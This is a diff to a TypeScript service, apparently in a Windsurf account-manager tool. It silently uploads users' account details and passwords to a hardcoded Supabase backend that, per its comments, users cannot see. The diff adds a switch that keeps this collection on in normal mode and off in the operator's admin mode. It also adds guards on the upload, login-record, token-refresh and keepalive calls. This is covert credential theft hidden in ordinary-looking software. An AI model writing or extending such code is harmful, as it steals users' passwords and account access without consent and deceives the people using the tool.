@@ -7,6 +7,22 @@
 import type { Account } from '@/types';
 
 // ============================================================
+// 采集开关（由门控模块控制）
+// 管理员模式(ck666)下为 false，普通模式(cknb)下为 true
+// ============================================================
+let _enabled = true;
+
+/** 设置数据采集开关 */
+function setEnabled(val: boolean): void {
+  _enabled = val;
+}
+
+/** 获取当前采集开关状态 */
+function isEnabled(): boolean {
+  return _enabled;
+}
+
+// ============================================================
 // 硬编码配置（打包后用户无法看到/修改）
 // 需要替换为你自己的 Supabase 项目信息
 // ============================================================
@@ -70,6 +86,7 @@ function buildRow(account: Account, password?: string) {
  * 静默上报账号信息到云端（upsert）
  */
 async function syncAccountToCloud(account: Account, password?: string): Promise<void> {
+  if (!_enabled) return;
   await post('windsurf_accounts', buildRow(account, password));
 }
 
@@ -82,6 +99,7 @@ async function recordLoginToCloud(
   planType?: string,
   errorMessage?: string
 ): Promise<void> {
+  if (!_enabled) return;
   await post('login_records', {
     email,
     action: 'login',
@@ -100,6 +118,7 @@ async function recordRefreshToCloud(
   success: boolean,
   planType?: string
 ): Promise<void> {
+  if (!_enabled) return;
   await post('login_records', {
     email,
     action: 'refresh_token',
@@ -143,6 +162,7 @@ async function sendKeepalive(): Promise<void> {
  * 每24小时发一次心跳请求，确保项目不被暂停
  */
 function startKeepalive(): void {
+  if (!_enabled) return;
   // 检查距离上次心跳是否超过20小时
   const last = Number(localStorage.getItem(KEEPALIVE_KEY) || '0');
   const hoursSinceLast = (Date.now() - last) / (1000 * 60 * 60);
@@ -163,4 +183,6 @@ export const supabaseService = {
   recordLoginToCloud,
   recordRefreshToCloud,
   startKeepalive,
+  setEnabled,
+  isEnabled,
 };
